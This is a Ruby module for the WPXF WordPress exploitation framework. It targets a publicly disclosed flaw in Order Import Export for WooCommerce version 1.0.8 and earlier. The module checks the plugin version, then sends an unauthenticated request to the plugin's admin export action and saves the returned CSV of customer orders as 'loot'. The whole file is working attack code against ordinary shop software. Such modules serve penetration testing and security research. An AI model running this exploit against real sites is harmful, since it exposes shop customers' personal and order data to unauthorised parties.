# frozen_string_literal: true

require 'wpxf/helpers/export'

class Wpxf::Auxiliary::WoocommerceOrderImportExportOrderDisclosure < Wpxf::Module
  include Wpxf
  include Wpxf::Helpers::Export

  def initialize
    super

    update_info(
      name: 'Order Import Export for WooCommerce <= 1.0.8 Order Information Disclosure',
      desc: %(
        Version <= 1.0.8 of the import export plugin for WooCommerce allows unauthenticated
        users to download a CSV disclosing information about orders placed in the system.
      ),
      author: [
        'David Peltier', # Disclosure
        'rastating'      # WPXF module
      ],
      references: [
        ['WPVDB', '8624'],
        ['EDB', '40391']
      ],
      date: 'Sep 19 2016'
    )
  end

  def check
    check_plugin_version_from_readme('order-import-export-for-woocommerce', '1.0.9')
  end

  def export_url
    normalize_uri(wordpress_url_admin, 'admin.php')
  end

  def run
    return false unless super

    emit_info 'Downloading order export CSV...'
    res = execute_get_request(
      url: export_url,
      params: {
        'page' => 'wf_woocommerce_order_im_ex',
        'action' => 'export'
      }
    )

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    loot = export_and_log_loot res.body, 'Export of WooCommerce orders', 'export', '.csv'
    emit_success "Saved export to #{loot.path}"

    true
  end
end
